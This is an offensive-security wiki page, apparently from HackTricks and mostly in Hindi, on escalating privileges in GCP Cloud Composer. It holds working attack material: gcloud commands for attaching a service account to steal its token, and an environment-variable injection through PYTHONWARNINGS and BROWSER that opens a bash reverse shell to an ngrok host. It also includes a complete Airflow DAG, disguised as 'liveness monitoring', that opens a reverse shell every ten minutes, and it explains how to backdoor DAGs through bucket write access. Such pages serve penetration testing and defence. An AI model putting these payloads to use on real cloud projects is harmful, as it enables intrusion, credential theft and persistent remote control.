# GCP - Composer Privesc

{{#include ../../../banners/hacktricks-training.md}}

## composer

अधिक जानकारी:

{{#ref}}
../gcp-services/gcp-composer-enum.md
{{#endref}}

### `composer.environments.create`

उस permission के साथ नए बनाए गए composer environment में **किसी भी service account को attach करना** संभव है। बाद में आप composer के अंदर कोड निष्पादित करके service account token चुरा सकते हैं।

<details><summary>अटैच किए गए service account के साथ Composer environment बनाना</summary>
```bash
gcloud composer environments create privesc-test \
--project "${PROJECT_ID}" \
--location europe-west1 \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
```
</details>

exploitation के बारे में अधिक जानकारी [**here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/i-composer.environmets.create.sh).

### `composer.environments.update`

composer environment को अपडेट करना संभव है, उदाहरण के लिए env variables को संशोधित करके:

<details><summary>code execution के लिए Composer environment के env variables अपडेट करें</summary>
```bash
# Even if it says you don't have enough permissions the update happens
gcloud composer environments update \
projects/<project-id>/locations/<location>/environments/<composer-env-name> \
--update-env-variables="PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19990 0>&1' & #%s" \
--location <location> \
--project <project-id>

# Call the API endpoint directly
PATCH /v1/projects/<project-id>/locations/<location>/environments/<composer-env-name>?alt=json&updateMask=config.software_config.env_variables HTTP/2
Host: composer.googleapis.com
User-Agent: google-cloud-sdk gcloud/480.0.0 command/gcloud.composer.environments.update invocation-id/826970373cd441a8801d6a977deba693 environment/None environment-version/None client-os/MACOSX client-os-ver/23.4.0 client-pltf-arch/arm interactive/True from-script/False python/3.12.3 term/xterm-256color (Macintosh; Intel Mac OS X 23.4.0)
Accept-Encoding: gzip, deflate, br
Accept: application/json
Content-Length: 178
Content-Type: application/json
X-Goog-Api-Client: cred-type/sa
Authorization: Bearer [token]
X-Allowed-Locations: 0x0

{"config": {"softwareConfig": {"envVariables": {"BROWSER": "/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/1890 0>&1' & #%s", "PYTHONWARNINGS": "all:0:antigravity.x:0:0"}}}}
```
</details>

TODO: नए pypi packages जोड़कर environment में RCE प्राप्त करें

### Dags डाउनलोड करें

चलाए जा रहे dags के स्रोत कोड की जाँच करें:

<details><summary>Composer environment से DAGs निर्यात और डाउनलोड करें</summary>
```bash
mkdir /tmp/dags
gcloud composer environments storage dags export --environment <environment> --location <loc> --destination /tmp/dags
```
</details>

### Dags आयात करें

python DAG code को एक फ़ाइल में जोड़ें और इसे चलाकर import करें:

<details><summary>मैलिसियस DAG को Composer environment में इम्पोर्ट करें</summary>
```bash
# TODO: Create dag to get a rev shell
gcloud composer environments storage dags import --environment test --location us-central1 --source /tmp/dags/reverse_shell.py
```
</details>

Reverse shell DAG:

<details><summary>Python DAG code for reverse shell</summary>
```python
import airflow
from airflow import DAG
from airflow.operators.bash_operator import BashOperator
from datetime import timedelta

default_args = {
'start_date': airflow.utils.dates.days_ago(0),
'retries': 1,
'retry_delay': timedelta(minutes=5)
}

dag = DAG(
'reverse_shell',
default_args=default_args,
description='liveness monitoring dag',
schedule_interval='*/10 * * * *',
max_active_runs=1,
catchup=False,
dagrun_timeout=timedelta(minutes=10),
)

# priority_weight has type int in Airflow DB, uses the maximum.
t1 = BashOperator(
task_id='bash_rev',
bash_command='bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/14382 0>&1',
dag=dag,
depends_on_past=False,
priority_weight=2**31 - 1,
do_xcom_push=False)
```
</details>

### Composer bucket पर Write Access

Composer environments के सभी components (DAGs, plugins और data) एक GCP bucket में स्टोर होते हैं। अगर attacker के पास उस पर read और write permissions हैं, तो वह bucket की निगरानी कर सकता है और **whenever a DAG is created or updated, submit a backdoored version** ताकि composer environment storage से backdoored version ही प्राप्त कर ले।

Get more info about this attack in:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

### Plugins इम्पोर्ट करना

TODO: plugins अपलोड करके क्या compromise किया जा सकता है यह जांचें

### Data इम्पोर्ट करना

TODO: data अपलोड करके क्या compromise किया जा सकता है यह जांचें

{{#include ../../../banners/hacktricks-training.md}}
